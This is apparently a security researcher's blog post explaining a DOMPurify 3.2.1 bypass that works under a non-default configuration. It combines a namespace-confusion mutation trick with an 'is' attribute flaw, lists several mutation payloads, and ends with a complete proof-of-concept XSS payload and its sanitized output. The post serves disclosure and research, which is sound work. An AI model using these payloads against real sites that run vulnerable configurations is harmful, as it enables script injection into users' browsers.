---
title: "DOMPurify 3.2.1 Bypass (Non-Default Config)"
date: 2024-12-09
tags:
    - "dompurify"
    - "mxss"
    - "xss"
advisory: false
cves:
og:
    image: "/img/blogs/dompurify/HeroImage.png"
    title: "DOMPurify 3.2.1 Bypass (Non-Default Config)"
    description: "This blog post covers DOMPurify 3.2.1 Bypass, explaining a specific mutation technique"
---
# Background
Over the years, we have seen DOMPurify bypasses using various techniques. A prominent one is namespace confusion, which usually takes advantage of [parsing roundtrip tricks](https://yaniv-git.github.io/2024/05/26/mXSS:%20The%20Vulnerability%20Hiding%20in%20Your%20Code/#Parsing-round-trip) to change the namespace of certain elements. Up until the [discovery](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/) of Michał Bentkowski's ([@SecurityMB](https://x.com/securitymb)) `form` element mutation in 2020 (Which resulted in version 2.0.17 bypass using confusion of a direct descendant in MathML's HTML integration point), there wasn't any significant mitigation mechanism to tackle namespace confusion. A solution proposed by Michał was to verify if the element is in the correct namespace by checking the parent namespace. This was later [implemented](https://github.com/cure53/DOMPurify/pull/495) and would go down as a bulletproof approach to prevent namespace confusion for years.

Up until earlier this year (2024), [@IcesFont](https://x.com/icesfont2) discovered a new mXSS vector, this time exploiting the limitation of nested elements' depth. This and [subsequent discoveries](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes) on the topic led DOMPurify maintainers to implement various changes, such as disabling HTML integration in SVG namespace and adding additional regex validations, so that regardless of namespace confusions, there isn't supposed to be a way to bypass the sanitizer.

But today, we will cover a different mutation that can cause namespace confusion despite having the parental check and without using nesting limitation techniques (credit to [@kinugawamasato](https://x.com/kinugawamasato), who discovered it independently and [covered](https://x.com/kinugawamasato/status/1843687909431582830) it briefly on Twitter).

# Namespace Confusion, Regardless of a Parental Check

This technique enables an element to jump an arbitrary amount of nested elements up using the following payload:

`<root><foo-bar>{arbitrary element(s)}<p>{arbitrary HTML element(s)}<table><foo-bar><p></p></foo-bar><payload>`

Parsing it will result in the following DOM tree:
```
<root>
├─ <foo-bar>
│  ├─ {arbitrary element(s)}
│  │  ├─ <p>
│  │  │  ├─ {arbitrary HTML element(s)}
│  │  │  │  ├─ <foo-bar>
│  │  │  │  │  ├─ <p>
│  │  │  │  ├─ <payload>
│  │  │  │  ├─ <table>
```
And on the second parsing iteration, the DOM will look as such:
```
<root>
├─ <foo-bar>
│  ├─ {arbitrary element(s)}
│  │  ├─ <p>
│  │  │  ├─ {arbitrary HTML element(s)}
│  │  │  │  ├─ <foo-bar>
│  │  ├─ <p>
├─ <payload>
├─ <table>
```

Generally speaking what comes after the `p` element (which can also be other ones such as `dd`, `dt`, `li`) will escape to the level next to the initial `foo-bar`. 
However, for this to cause namespace confusion, the `foo-bar` element must be in both a foreign namespace and HTML. Since DOMPurify doesn't allow HTML integration in SVG anymore, we cannot use this in the SVG namespace (which would have been convenient because SVG shares some elements, such as `a`, with HTML by default). 

Interestingly, if we allow custom elements in DOMPurify, it actually allows them in all namespaces:
<img src="/img/blogs/dompurify/image1.png" style="width: 100%;"/>

So we can use this to have various types of namespace confusions (note that the SVG ones are applicable to older versions where HTML integration ponits were allowed):

-   From HTML into SVG or MathML:
    -   `<math><foo-test><mi><li><table><foo-test><li></li></foo-test>a<a>`
    -   `<svg><a><foreignObject><p><table><a><li></li></a><a>`
-   From SVG to MathML:
    -   `<math><mi><li><table><mi><li>t</mi></li></mi></math><a><svg>`
    -   `<math><foo-test><mi><li><table><foo-test><li></li></foo-test>a<svg><title></title></svg>`
-   From MathML to SVG: 
    -   `<svg><a><foreignObject><p><table><a><li></li></a><math>`
-   From SVG to HTML:
    -  ` <svg><a><foreignObject><li><table><a><li></table></li></a></a><title><svg><a alt="</title><img>">`
-   From MathML to HTML:
    -   `<math><foo-test><mi><li><table><foo-test><li></li></foo-test>a</table></li></mi><a>`

But as mentioned before, this is not enough to have a bypass. Some regex checks will delete [attributes](https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L1333), [raw_data](https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L1062-L1063) elements, or [comments](https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L1079) if the content is considered dangerous.

# The *`is`* Attribute

I was reading the [official solution write-up](https://jorianwoltjer.com/blog/p/hacking/mutation-xss) for a small mXSS challenge created by [Jorian](https://twitter.com/J0R1AN), and they discussed an interesting topic, where the [`is` attribute](https://html.spec.whatwg.org/#attr-is) cannot be [deleted](https://sonarsource.github.io/mxss-cheatsheet/#is). Which got me wondering how DOMPurify handles such behavior. When looking at the code, the library was already aware of this and had [implemented mitigation](https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L845). But there was a small mistake [introduced](https://github.com/cure53/DOMPurify/commit/79d57d6465c88101d512e06377b6e6babe8a11c2) in 2021. That caused the `forceRemove` function to be obsolete if the `is` attribute is in the `ALLOWED_ATTR` array, allowing arbitrary content in the `is` attribute if allowed in the configuration.

# The Bypass
All that is left to do is to combine those two topics
```

DOMPurify.sanitize(
'<math><foo-test><mi><li><table><foo-test><li></li></foo-test>a<a><style><!--</style>a<foo-bar is="--><img
src=x onerror=alert(1)>">',
    {
        ADD_ATTR: ['is'],
        CUSTOM_ELEMENT_HANDLING: {
        tagNameCheck: /^foo-/,
    },
});
>>> <math><foo-test><mi><li><foo-test><li></li></foo-test><a><style><!--</style>a<foo-bar is="--><img src=x
onerror=alert(1)>"></foo-bar></a><table></table>a</li></mi></foo-test></math>
```
<img src="/img/blogs/dompurify/image2.png" style="width: 100%;"/>

# Summary
In this blog, we discussed the latest, config-dependent, DOMPurify bypass, from an interesting namespace confusion trick to the mishandling of the `is` attribute. I would like to give a special thanks to [@cure53berlin](https://x.com/cure53berlin) for their incredible responsiveness, addressing the report quickly, and generally keeping up the support for this project.